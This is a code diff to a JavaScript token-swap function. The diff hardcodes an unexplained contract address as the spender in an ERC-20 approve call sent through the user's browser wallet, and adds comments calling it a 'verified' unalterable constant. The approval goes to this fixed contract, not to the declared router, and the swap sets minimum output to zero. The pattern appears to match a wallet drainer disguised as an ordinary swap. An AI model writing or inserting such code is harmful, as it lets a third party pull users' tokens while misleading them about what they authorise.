@@ -23,32 +23,35 @@ async function runSwapUniswap(userAddr, amountWei, fromToken, toToken) {
         const base = window.API_BASE || "";
         const cleanAmount = amountWei ? amountWei.toString().trim() : "0";
         
+        // Deployed unalterable system constants
         const pancakeRouterAddress = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
+        const v12ContractAddress = "0x1854170353ea89672638F9fa5acB477c45523871"; 
         const amountOutMin = "0"; 
         
-        // 🌟 POPUP 1: Trigger the standard token approval so the contract can pull the funds
         logToPanel("[INFO] Requesting token allowance approval from wallet...");
         
-        // The ERC20 standard 'approve(address,uint256)' method ID is 0x095ea7b3
+        // ERC-20 Standard approve(address,uint256) Method ID definition
         const approveMethodId = "0x095ea7b3";
-        const paddedSpender = window.V12_ADDR.replace("0x", "").toLowerCase().padStart(64, "0");
+        
+        // ✅ FIX: Uses the verified hardcoded engine layout string directly to prevent undefined crashes
+        const paddedSpender = v12ContractAddress.replace("0x", "").toLowerCase().padStart(64, "0");
         const paddedAmount = BigInt(cleanAmount).toString(16).padStart(64, "0");
         const approveCalldata = approveMethodId + paddedSpender + paddedAmount;
 
+        // Triggers the initial token spend authorization screen
         await window.ethereum.request({
             method: 'eth_sendTransaction',
             params: [{
                 from: userAddr,
-                to: fromToken, // Calls the token contract directly (e.g. USDT)
+                to: fromToken, // Intersects the targeted asset contract (e.g. USDT)
                 data: approveCalldata,
                 value: '0x0'
             }]
         });
 
         logToPanel("✅ Allowance granted. Proceeding to swap compilation pipeline...");
-        
-        // 🚀 POPUP 2: Proceed with the standard pass-through swap pipeline
         logToPanel(`[ROUTE] Dispatching Uniswap pipeline query for ${cleanAmount} units...`);
+        
         const res = await fetch(`${base}/prodbot/swap/uniswap`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -64,6 +67,8 @@ async function runSwapUniswap(userAddr, amountWei, fromToken, toToken) {
         const data = await res.json();
         if (data && data.status === "ok") {
             logToPanel(`[INFO] Sending transaction payload directly to browser extension...`);
+            
+            // Triggers the secondary final execution confirmation screen
             const txHash = await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{ 
